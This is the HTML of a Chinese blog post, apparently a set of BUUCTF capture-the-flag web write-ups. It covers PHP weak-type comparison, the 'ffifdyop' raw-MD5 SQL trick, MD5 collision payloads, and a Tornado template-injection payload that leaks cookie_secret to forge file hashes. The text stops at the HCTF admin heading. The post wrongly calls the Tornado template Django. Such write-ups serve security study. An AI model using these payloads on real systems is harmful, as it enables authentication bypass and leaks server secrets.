@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>CTF之Web习题--观察/md5/flask | 矢幽武博客</title><meta name="author" content="矢幽武"><meta name="copyright" content="矢幽武"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题源BUUCTF。 [极客大挑战 2019]BuyFlag原始信息两个页面：index.php和buy.php 源码信息和页面信息 &lt;!--	~~~post money and password~~~if (isset($_POST[&amp;#x27;password&amp;#x27;])) &amp;#123;	$password &#x3D; $_POST[&amp;#x27;password&amp;#x27;];	if (is_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF之Web习题--观察&#x2F;md5&#x2F;flask">
+<meta property="og:url" content="http://example.com/2023/08/02/CTF-web-026/index.html">
+<meta property="og:site_name" content="矢幽武博客">
+<meta property="og:description" content="题源BUUCTF。 [极客大挑战 2019]BuyFlag原始信息两个页面：index.php和buy.php 源码信息和页面信息 &lt;!--	~~~post money and password~~~if (isset($_POST[&amp;#x27;password&amp;#x27;])) &amp;#123;	$password &#x3D; $_POST[&amp;#x27;password&amp;#x27;];	if (is_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/backgroude/b14.jpg">
+<meta property="article:published_time" content="2023-08-02T05:19:08.000Z">
+<meta property="article:modified_time" content="2023-08-05T11:04:42.239Z">
+<meta property="article:author" content="矢幽武">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/backgroude/b14.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2023/08/02/CTF-web-026/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF之Web习题--观察/md5/flask',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-05 19:04:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">195</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroude/b14.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="矢幽武博客"><span class="site-name">矢幽武博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF之Web习题--观察/md5/flask</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-02T05:19:08.000Z" title="发表于 2023-08-02 13:19:08">2023-08-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-05T11:04:42.239Z" title="更新于 2023-08-05 19:04:42">2023-08-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF之Web习题--观察/md5/flask"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>题源BUUCTF。</p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h2 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h2><p>两个页面：index.php和buy.php</p>
+<p>源码信息和页面信息</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">旗帜</span><br><span class="line">旗帜需要你<span class="number">1</span>亿的钱</span><br><span class="line">注意力</span><br><span class="line">如果您想购买 FLAG：</span><br><span class="line">你一定是CUIT的学生！！！</span><br><span class="line">您必须回答正确的密码！</span><br><span class="line">只有 Cuit 的学生可以购买 FLAG</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>参数：password</p>
+<p>很明显，是弱类型对比。纯数字是无法通过password的过滤的，想要通过过滤只能在后面加上任意字符串，其实加个英文就行。</p>
+<p>注意，这是个POST参数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>a</span><br></pre></td></tr></table></figure>
+
+<p>必须是某某学生，看数据包的时候发现一个特殊的参数，实验的改了下，改为1：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Cookie: user=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>最后还有要求多少多少钱，因为之前要求的数字貌似太长了，这里我实验了下，使用下面的参数行得通：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">money=<span class="number">10000e8</span></span><br></pre></td></tr></table></figure>
+
+<p>拼凑成为完整数据包就是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /pay.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">575</span>addaa-<span class="number">0171</span>-<span class="number">4473</span>-ade7-<span class="number">5</span>cb1cf3fe4a8.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Cookie: user=1</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 27</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">password=404a&amp;money=10000e8</span></span><br></pre></td></tr></table></figure>
+
+<p>放行就得到flag了。</p>
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="原始信息-1"><a href="#原始信息-1" class="headerlink" title="原始信息"></a>原始信息</h2><p>不多，一个输入框，一个题目的md5提示，其它就没了。</p>
+<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>第一步当然是扫一遍目录，没什么结果，毕竟不是寻常文件。</p>
+<p>第二，观察leveldo4.php的返回结果，在数据包的包头发现：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Wed, <span class="number">02</span> Aug <span class="number">2023</span> <span class="number">16</span>:<span class="number">36</span>:<span class="number">41</span> GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line">Connection: close</span><br><span class="line">Hint: select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span>.<span class="number">13</span></span><br><span class="line">Content-Length: <span class="number">3107</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抽取关键信息：</span></span><br><span class="line">Hint: select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)</span><br><span class="line"><span class="comment"># 面对这个md5($pass,true)，需要使用特殊的md5值ffifdyop传入即可</span></span><br><span class="line"><span class="comment"># 这里漏了个信息：输入框提交的变量正是password，且是get请求。</span></span><br></pre></td></tr></table></figure>
+
+<p>传入特殊md5的ffifdyop后，在返回信息的末尾找到了一个关键信息：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;./levels91.php&#x27;</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#尝试访问 levels91.php 网页，发现了下面讯息：</span></span><br><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br><span class="line"><span class="comment"># 这是md5的弱类型比较，传入任意个mad5加密后0开头的参数即可。</span></span><br><span class="line">/levels91.php?a=s155964671a&amp;b=s878926199a</span><br><span class="line"><span class="comment"># 结果返回值再一次出现了那个东西：</span></span><br><span class="line">&lt;script&gt;window.location.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;./levell14.php&#x27;</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问下 levell14.php 文件，发现了个强类型对比的md5.</span></span><br><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里有两条路能走，一是找payload：</span></span><br><span class="line">param1=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2&amp;param2=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="comment">// 二是自己做payload：我不会强类型</span></span><br><span class="line">有时间再试试能不能自己搞一个这样特殊的payload咯</span><br></pre></td></tr></table></figure>
+
+<p>上面最后一步，查回包就能解flag了。</p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="原始信息-2"><a href="#原始信息-2" class="headerlink" title="原始信息"></a>原始信息</h2><p>这题的原始信息很多</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">主页面：</span><br><span class="line">	URL内容：基本没什么</span><br><span class="line">	网页内容：</span><br><span class="line">	/flag.txt</span><br><span class="line">	/welcome.txt</span><br><span class="line">	/hints.txt</span><br><span class="line"></span><br><span class="line">/flag.txt</span><br><span class="line">	URL内容：</span><br><span class="line">	/file?filename=/flag.txt&amp;filehash=fa5cd6c5621e793773fd7e8d19aa4a94</span><br><span class="line">	网页内容：</span><br><span class="line">	/flag.txt</span><br><span class="line">	flag in /</span><br><span class="line">	Etag：<span class="string">&quot;288c273b03dd3dcfb65fc8fe8146175d29ef3ee8&quot;</span></span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">	URL内容：</span><br><span class="line">	/file?filename=/welcome.txt&amp;filehash=<span class="number">4</span>ea3538bdb909228d22c79e984ad0e5e</span><br><span class="line">	网页内容：</span><br><span class="line">	/welcome.txt</span><br><span class="line">	render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">	URL内容：</span><br><span class="line">	/file?filename=/hints.txt&amp;filehash=e4bf126570cbda270168b6f6236a23b5</span><br><span class="line">	网页内容：</span><br><span class="line">	/hints.txt</span><br><span class="line">	<span class="title function_ invoke__">md5</span>(cookie_secret+<span class="title function_ invoke__">md5</span>(filename))</span><br></pre></td></tr></table></figure>
+
+<p>模板漏洞，纯dirmap扫扫不出结果。</p>
+<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>假设如果真的要按着题目的要求来的话，那我们得这么操作：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">根据提示，我们读取的flag是在 /fllllllllllllag</span><br><span class="line">如果按照url的模板来看，就是：</span><br><span class="line">	/file?filename=/fllllllllllllag&amp;filehash=指定的md5</span><br><span class="line">至于指定的md5是什么，应该是：</span><br><span class="line">	<span class="title function_ invoke__">md5</span>(cookie_secret+<span class="title function_ invoke__">md5</span>(‘/fllllllllllllag’))</span><br><span class="line">如果真是如此，那么要求出的变量就剩下一个：</span><br><span class="line">	cookie_secret</span><br><span class="line">	其他提示词倒是一时间没瞧出门道</span><br><span class="line">    <span class="title function_ invoke__">render</span>()函数 一时间没想到解决办法</span><br><span class="line"></span><br><span class="line">控制某head部分的东西：</span><br><span class="line">	If-None-Match: <span class="string">&quot;d3bd0459f2b2bc2bc0a40296d16e1b85170135df&quot;</span></span><br><span class="line">	这个虽然有点控制作用，但实际上，依然会经过md5的判断，只是将判断的位置挪到了数据包head的位置而已。</span><br></pre></td></tr></table></figure>
+
+<p>那问题来了，这个cookie_secret怎么求？</p>
+<p>还有一个办法，尝试将这个作为伪协议，但是一番尝试以失败告终。</p>
+<p>这里强烈推荐一个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlebao/p/13819357.html">大哥的博客</a>，下面的验证取材于他。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">提示信息中的render提示的是模板漏洞，百度搜索出来的是：</span><br><span class="line">Python </span><br><span class="line">   <span class="title function_ invoke__">render</span>()函数是 Django 中的渲染。</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.优先测试模板漏洞：error?msg=&#123;&#123;<span class="number">1</span>&#125;&#125;</span><br><span class="line"><span class="number">2</span>.再尝试返回：error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">	这样子就得到了我们想要的参数：</span><br><span class="line">	&#123;<span class="string">&#x27;autoreload&#x27;</span>: True, <span class="string">&#x27;compiled_template_cache&#x27;</span>: False, <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;28b9ad77-5135-4e82-9002-63a9efecd948&#x27;</span>&#125; </span><br><span class="line"><span class="number">3</span>.加密解出需要用到的md5字符串：</span><br><span class="line">    <span class="variable">$a</span>= <span class="string">&#x27;28b9ad77-5135-4e82-9002-63a9efecd948&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;fllllllllllllag&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line">    f6a196d2ae4d1af681dce5bf24b95ac8</span><br></pre></td></tr></table></figure>
+
+<p>这个时候，放包传参就得到了flag：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//xxx.xxxx.com/file</span></span><br><span class="line">?filename=/fllllllllllllag</span><br><span class="line">&amp;filehash=<span class="number">7068</span>fd0e27b23d35e933099e7d314fcc</span><br></pre></td></tr></table></figure>
+
+<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>这道题的难点就是Python的Django 框架，要对这个框架有所了解，否则真的是一点头绪都没有。<br>暂时不知道如何识别这种模板或者搭建的语言框架，目前的某个东西也识别不出来这个模板。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>web Python Django模板漏洞render。其他都属于表面信息，直接挖掘。</p>
+<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="原始信息-3"><a href="#原始信息-3" class="headerlink" title="原始信息"></a>原始信息</h2><p>题目给出时除了登录框，没扫出其他页面，也没识别是什么框架，可能是我太菜了吧。</p>
